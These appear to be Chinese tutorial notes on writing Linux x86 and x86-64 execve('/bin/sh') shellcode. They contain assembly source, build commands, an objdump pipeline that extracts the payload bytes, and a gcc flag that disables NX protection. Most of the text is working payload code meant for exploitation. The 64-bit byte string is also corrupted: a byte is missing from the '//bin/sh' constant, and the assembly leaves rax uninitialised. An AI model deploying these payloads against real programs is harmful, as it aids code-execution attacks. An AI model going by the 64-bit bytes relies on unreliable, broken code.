linux32位shellcode
global _start
section .text

_start:
xor ecx,ecx;            #ecx = null
mul ecx;                #eax和edx = null
mov al,11;              #execve syscall
push ecx;               #string null
push 0x68732f2f;        #"//sh"
push 0x6e69622f;        #"/bin"
mov ebx,esp;            #pointer to "/bin/sh\0" string
int 0x80;


$nasm -f elf32 shellcode.asm                    #对shellcode进行编译
$ld -m elf_i386 shellcode.o -o shellcode        #对shellcode进行链接
提取shellcode
$objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s|sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

将提取出来的shellcode字符串放到c程序中，赋值给shellcode[].shellcode作为全局初始化变量，是存放在.data段的，而编译时默认开启的NX保护机制，会将数据所在的内存页标始为不可执行，当程序转入shellcode执行时抛出异常。因此，我们需要关掉NX
$gcc -m32 -z execstack shellcode.c -o shellcode

linux64位shellcode
global _start
section .text 

_start:
xor rdx,rdx
mov qword rbx,'//bin/sh'    ;68732f6e69622f2f
shr rbx,0x8
push rbx
mov rdi,rsp
push rax
push rdi
mov rsi,rsp
mov al,0x3b
syscall

$nasm -f elf64 shellcode64.asm
$ld -m elf_x86_64 shellcode64.o -o shellcode64 
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
